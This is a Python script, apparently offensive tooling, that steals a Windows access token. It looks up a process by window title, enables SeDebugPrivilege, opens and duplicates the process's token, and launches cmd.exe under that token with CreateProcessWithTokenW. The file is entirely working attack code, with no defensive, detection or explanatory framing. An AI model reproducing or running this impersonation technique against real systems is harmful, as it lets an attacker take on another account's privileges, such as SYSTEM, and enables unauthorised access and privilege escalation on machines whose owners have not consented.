import ctypes
from ctypes import wintypes

# 1. DLL Loading
k_handle = ctypes.WinDLL("Kernel32.dll", use_last_error=True)
u_handle = ctypes.WinDLL("User32.dll", use_last_error=True)
a_handle = ctypes.WinDLL("Advapi32.dll", use_last_error=True)

# 2. Constants & Access Rights
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
TOKEN_ALL_ACCESS = 0xF00FF
SE_PRIVILEGE_ENABLED = 0x00000002
LOGON_WITH_PROFILE = 0x00000001
CREATE_NEW_CONSOLE = 0x00000010

# 3. Security Structures
class LUID(ctypes.Structure):
    _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [("PrivilegeCount", wintypes.DWORD), ("Privileges", LUID_AND_ATTRIBUTES * 1)]

class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("nLength", wintypes.DWORD), ("lpSecurityDescriptor", wintypes.LPVOID), ("bInheritHandle", wintypes.BOOL)]

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD), ("lpReserved", wintypes.LPWSTR), ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR), ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD), ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD), ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD), ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
        ("hStdInput", wintypes.HANDLE), ("hStdOutput", wintypes.HANDLE), ("hStdError", wintypes.HANDLE)
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE), ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD)]

# 4. Helper Function: Enable Privilege
def enable_privilege(priv_name):
    h_token = wintypes.HANDLE()
    # Open current process token
    k_handle.OpenProcessToken(k_handle.GetCurrentProcess(), (0x0020 | 0x0008), ctypes.byref(h_token))
    
    luid = LUID()
    a_handle.LookupPrivilegeValueW(None, priv_name, ctypes.byref(luid))
    
    tp = TOKEN_PRIVILEGES()
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    
    success = a_handle.AdjustTokenPrivileges(h_token, False, ctypes.byref(tp), 0, None, None)
    k_handle.CloseHandle(h_token)
    return success and k_handle.GetLastError() == 0

def impersonate_and_spawn():
    # 5. Locate Target Process
    target_window = input("Enter Window Name To Hook Into: ").encode('utf-8')
    h_wnd = u_handle.FindWindowA(None, target_window)
    if not h_wnd: return

    pid = wintypes.DWORD()
    u_handle.GetWindowThreadProcessId(h_wnd, ctypes.byref(pid))

    # 6. Enable SeDebugPrivilege to allow Token Duplication
    if not enable_privilege("SeDebugPrivilege"):
        print("[ERROR] Failed to enable SeDebugPrivilege. Run as Admin.")
        return

    # 7. Open Target Process and Token
    h_process = k_handle.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    h_token = wintypes.HANDLE()
    k_handle.OpenProcessToken(h_process, TOKEN_ALL_ACCESS, ctypes.byref(h_token))

    # 8. Duplicate the Token
    # DuplicateTokenEx creates a new primary token from an existing one
        
    h_dup_token = wintypes.HANDLE()
    sa = SECURITY_ATTRIBUTES()
    sa.nLength = ctypes.sizeof(sa)

    # ImpersonationLevel 2 = SecurityImpersonation; TokenType 1 = TokenPrimary
    success = a_handle.DuplicateTokenEx(h_token, TOKEN_ALL_ACCESS, ctypes.byref(sa), 2, 1, ctypes.byref(h_dup_token))
    
    if not success:
        print(f"[ERROR] Token duplication failed: {k_handle.GetLastError()}")
        return

    # 9. Spawn New Process with the Duplicated Token
    si = STARTUPINFOW()
    si.cb = ctypes.sizeof(si)
    si.dwFlags = 0x1
    si.wShowWindow = 0x1 # SW_SHOWNORMAL
    pi = PROCESS_INFORMATION()

    print("[INFO] Spawning impersonated cmd.exe...")
    success = a_handle.CreateProcessWithTokenW(
        h_dup_token, LOGON_WITH_PROFILE, "C:\\Windows\\System32\\cmd.exe",
        None, CREATE_NEW_CONSOLE, None, None, ctypes.byref(si), ctypes.byref(pi)
    )

    if success:
        print(f"[SUCCESS] Impersonated Process Created! PID: {pi.dwProcessId}")
        k_handle.CloseHandle(pi.hProcess)
        k_handle.CloseHandle(pi.hThread)
    else:
        print(f"[ERROR] CreateProcessWithTokenW failed: {k_handle.GetLastError()}")

    # 10. Final Cleanup
    k_handle.CloseHandle(h_dup_token)
    k_handle.CloseHandle(h_token)
    k_handle.CloseHandle(h_process)

if __name__ == "__main__":
    impersonate_and_spawn()
